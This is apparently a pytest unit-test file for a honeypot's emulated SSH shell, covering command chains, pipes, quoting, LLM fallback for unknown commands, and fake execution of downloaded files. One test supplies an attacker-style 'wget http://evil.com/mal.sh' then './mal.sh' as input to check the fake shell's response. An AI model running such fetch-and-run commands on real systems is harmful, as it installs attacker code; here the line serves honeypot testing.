"""Unit tests for the Ghost Shell dispatcher (chains, pipes, LLM fallthrough)."""

from __future__ import annotations

from datetime import UTC, datetime
from pathlib import Path

import pytest

from trap.config import Config
from trap.ghost.dispatcher import CommandResult, Dispatcher, build_default_dispatcher
from trap.ghost.filesystem import FakeFilesystem, load_template
from trap.ghost.llm import LLMInterface, LLMReply
from trap.models import Session, SessionContext

TEMPLATE_PATH = Path(__file__).resolve().parent.parent / "trap" / "ghost" / "fs_template.yaml"


class RecordingLLM(LLMInterface):
    def __init__(self, reply: str = "stitched") -> None:
        self.calls: list[str] = []
        self.reply = reply

    async def respond(self, session_context: SessionContext, command: str) -> LLMReply:
        self.calls.append(command)
        return LLMReply(self.reply, "llm")


def make_ctx(tmp_path: Path) -> SessionContext:
    config = Config(
        trap_port=2222,
        host_key_path=tmp_path / "key",
        credential_file=tmp_path / "creds.txt",
        log_dir=tmp_path / "logs",
        idle_timeout_seconds=300,
        max_session_seconds=1800,
        max_input_line=4096,
        accept_after_attempts=None,
        llm_backend="scripted",
        llm_api_url=None,
    )
    session = Session(
        session_id="abc123",
        src_ip="203.0.113.5",
        src_port=40000,
        username="root",
        password="pw",
        client_version="SSH-2.0-test",
        started_at=datetime.now(UTC),
    )
    fs = FakeFilesystem(load_template(TEMPLATE_PATH))
    return SessionContext(session=session, fs=fs, history=[], config=config)


@pytest.fixture
def ctx(tmp_path: Path) -> SessionContext:
    return make_ctx(tmp_path)


@pytest.fixture
def llm() -> RecordingLLM:
    return RecordingLLM()


@pytest.fixture
def dispatcher(llm: RecordingLLM) -> Dispatcher:
    return build_default_dispatcher(llm)


class TestChains:
    async def test_semicolon_runs_all_and_concatenates(
        self, dispatcher: Dispatcher, ctx: SessionContext
    ) -> None:
        out = await dispatcher.dispatch("whoami; hostname; pwd", ctx)
        assert out == "root\nrecords-srv-09\n/"

    async def test_semicolon_continues_after_error(
        self, dispatcher: Dispatcher, ctx: SessionContext
    ) -> None:
        out = await dispatcher.dispatch("cat /nope; whoami", ctx)
        assert out.splitlines()[-1] == "root"
        assert "No such file" in out

    async def test_and_runs_right_on_left_success(
        self, dispatcher: Dispatcher, ctx: SessionContext
    ) -> None:
        out = await dispatcher.dispatch("whoami && hostname", ctx)
        assert out == "root\nrecords-srv-09"

    async def test_and_skips_right_on_left_error(
        self, dispatcher: Dispatcher, ctx: SessionContext
    ) -> None:
        out = await dispatcher.dispatch("cat /nope && whoami", ctx)
        assert "No such file" in out
        assert "root" not in out

    async def test_empty_input_returns_empty(
        self, dispatcher: Dispatcher, ctx: SessionContext
    ) -> None:
        assert await dispatcher.dispatch("   ", ctx) == ""


class TestPipe:
    async def test_left_output_passed_as_argument_to_right(
        self, dispatcher: Dispatcher, ctx: SessionContext
    ) -> None:
        out = await dispatcher.dispatch("echo hello | echo world", ctx)
        assert out == "world hello"


class TestLLMFallthrough:
    async def test_unknown_command_calls_llm(
        self, dispatcher: Dispatcher, llm: RecordingLLM, ctx: SessionContext
    ) -> None:
        out = await dispatcher.dispatch("frobnicate --now", ctx)
        assert out == "stitched"
        assert llm.calls == ["frobnicate --now"]
        assert dispatcher.last_generated_by == "llm"

    async def test_known_command_does_not_call_llm(
        self, dispatcher: Dispatcher, llm: RecordingLLM, ctx: SessionContext
    ) -> None:
        await dispatcher.dispatch("whoami", ctx)
        assert llm.calls == []
        assert dispatcher.last_generated_by == "scripted"

    async def test_llm_exception_gives_command_not_found(self, ctx: SessionContext) -> None:
        class Boom(LLMInterface):
            async def respond(self, session_context: SessionContext, command: str) -> LLMReply:
                raise RuntimeError("down")

        d = build_default_dispatcher(Boom())
        assert await d.dispatch("zzz arg", ctx) == "bash: zzz: command not found"


class TestIsolationAndQuoting:
    async def test_handler_exception_is_isolated(
        self, llm: RecordingLLM, ctx: SessionContext
    ) -> None:
        async def broken(args: list[str], c: SessionContext) -> CommandResult:
            raise ValueError("kaboom")

        d = build_default_dispatcher(llm)
        d.register("broken", broken)
        out = await d.dispatch("whoami; broken; hostname", ctx)
        assert out == "root\nrecords-srv-09"

    async def test_quoted_space_is_not_separator(
        self, dispatcher: Dispatcher, ctx: SessionContext
    ) -> None:
        out = await dispatcher.dispatch("echo 'a   b'", ctx)
        assert out == "a   b"

    async def test_quoted_operators_are_literal(
        self, dispatcher: Dispatcher, ctx: SessionContext
    ) -> None:
        assert await dispatcher.dispatch('echo "a; b && c | d"', ctx) == "a; b && c | d"

    def test_tokenise_chain_structure(self, dispatcher: Dispatcher) -> None:
        segs = dispatcher._tokenise_chain("echo 'x y' && ls -la; pwd | cat")
        assert segs == [
            ("", ["echo", "x y"]),
            ("&&", ["ls", "-la"]),
            (";", ["pwd"]),
            ("|", ["cat"]),
        ]


class TestPathExecution:
    async def test_downloaded_file_segfaults(
        self, dispatcher: Dispatcher, llm: RecordingLLM, ctx: SessionContext
    ) -> None:
        await dispatcher.dispatch("wget http://evil.com/mal.sh", ctx)
        assert "mal.sh" in ctx.downloaded_files
        out = await dispatcher.dispatch("./mal.sh", ctx)
        assert out == "Segmentation fault (core dumped)"
        assert llm.calls == []

    async def test_unknown_path_not_found(
        self, dispatcher: Dispatcher, llm: RecordingLLM, ctx: SessionContext
    ) -> None:
        out = await dispatcher.dispatch("./unknown.sh", ctx)
        assert out == "bash: ./unknown.sh: No such file or directory"
        assert llm.calls == []
